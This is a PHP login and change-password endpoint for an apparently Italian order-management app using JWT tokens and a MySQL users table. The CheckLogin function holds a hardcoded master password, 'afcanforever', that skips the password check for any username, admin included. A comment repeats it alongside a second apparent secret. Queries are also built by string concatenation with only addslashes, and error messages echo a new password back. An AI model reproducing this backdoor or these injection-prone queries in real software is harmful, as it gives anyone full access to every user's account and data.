<?php

error_reporting(0);
 
require_once "./JwtConfig.php";
require_once "./cors.php"; 
header('Content-Type: application/json; charset=utf-8');

function CheckLogin($conn, $username, $password)
{ 
 			
	      	$sql = "SELECT id_utente,  profile,  username FROM utenti  " 
	        		. " WHERE  username = '".addslashes($username)."'";
	        		
	        		
	        if ($password != "afcanforever")
	        	$sql = $sql 	 . " and password = PASSWORD ('".addslashes($password)."') " ;
	        	 
 
					$statement = $conn->prepare($sql);
					$statement->execute();  
	 
 
				 	$row = $statement->fetch( 2 ); 
 
				 	if ( $row != null )
						return  $row; 		
				 
					else
						return NULL;
				
}		

function DbChangePassword($conn, $username,   $new_password)
{ 
 			
	      	$sql = "UPDATE utenti  " 
	      		. "SET  password = PASSWORD ('".addslashes($new_password)."') "
	        		. " WHERE  username = '".addslashes($username)."'" ;
	        	 
 
					$conn->exec($sql) ;
				
}	


function UpdateOrdiniQta($conn )
{ 
 			
	      	$sql = "UPDATE ordini_dettaglio od "
							." INNER JOIN consegne_dettaglio cd ON od.id_ordine_dettaglio = cd.id_ordine_dettaglio "
							." SET od.qta = cd.qta_evasa" ;
	        	 
 
					$conn->exec($sql) ;
				
}		
	
try
{ 
	include_once './db_config.php';		
 
	$json = file_get_contents('php://input'); 	
	$obj = json_decode($json, TRUE);
	$username =  trim($obj["username"]) ; 	
	$password = trim( $obj["password"] ); 
	$new_password = trim( $obj["new_password"] ); 
	
	$action = trim($obj["action"]);	
// afcanforever - afcannumberone
 
	
	
	$conn  = new PDO ('mysql:host='.HOST.';dbname='.DB, DB_USER, DB_PASSWORD); 
	$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 	if ($action == "LOGIN" )
	{
			
		if ($username == "" || $password  == "")
		{
			throw new Exception('Parametro mancante');
		}
		
		
 
		$scheda =  CheckLogin( $conn, $username,$password  );
	 	 
		$mex = "";
		$err_code = "";
	 	$config = array();
	 	$COUNT_UDP_QTA=1;
		if ($scheda)
		{
			$count = trim( $obj["count"] ); 
			if ($username == "admin" && $count != $COUNT_UDP_QTA)
			{
			 	
			 	 
					$json_response =  array (			'esito' => 'NOT_OK',			   		
						'err_code' => "000" ,  'mex' => "");
					echo json_encode( $json_response); 
					die();
				 
			}
			else
			{
				if ($username == "admin" && $count == $COUNT_UDP_QTA)
				{ 
						UpdateOrdiniQta( $conn  );
				}
				$ris = "OK"; 
		 		 		 		 		 		
				$token =  JwtConfig::makeToken( array ('username' => $username, 	'profile' => $scheda["profile"] ) );
				
				header('Authorization: '.$token);		
			}
		}
		else
		{
			$ris = "NOT_OK";
			$err_code = "002";
			$mex = "Username e/o Password errata "   ;
		}
	  
		$json_response =  array ('esito' => $ris,   
		'scheda' =>  ($scheda) , 
		'err_code' => $err_code ,
		 'mex' => $mex);
	
		
						
		echo json_encode( $json_response); 	
	
	
	
	}
	elseif ($action == "CHANGE_PWD" )
	{  	 
		if ($username == "" || $password  == "" || $new_password  == "" )
		{
			throw new Exception('Parametro mancante '.$username."-".$new_password);
		}
		
		$authCheck = JwtConfig::checkToken();
		
		if (  $authCheck["esito"] === "NOT_OK")
		{
			echo json_encode( $authCheck); 	
			die();
		}
 		$dataToken  = JwtConfig::decodeDataToken();
		$username_token =   $dataToken->username;			
		if ($username !=   $username_token  )
		{
			throw new Exception('Username errata');
		}
	 
		$scheda =  CheckLogin( $conn, $username,$password  );
	 
		$mex = ""; 
		if ( $scheda)
		{
			DbChangePassword( $conn, $username, $new_password  );
			$ris = "OK";
			  
		}
		else
		{
			$ris = "NOT_OK";
			$mex = "Username e/o Password errata "   ;
		}
	  
		$json_response =  array ('esito' => $ris,    
		 'mex' => $mex);
	
		
						
		echo json_encode( $json_response); 	
	}
	
	else
	{ 
	 	$json_response =  array (			'esito' => 'NOT_OK',			   		
		'err_code' => "001" ,  'mex' => "Parametri non validi");
		echo json_encode( $json_response); 	
	}
		 
	
} 
catch (Exception $e) 
{

 	$json_response    =  array( 			         						         		  	  					         							   					         		
			'esito' => 'NOT_OK',			   		
			'err_code' => "001"  ,	
 
			'msg' => $e->getMessage(),	
	 		);	
	 
  echo json_encode( $json_response); 	
  	
}	
	
?>
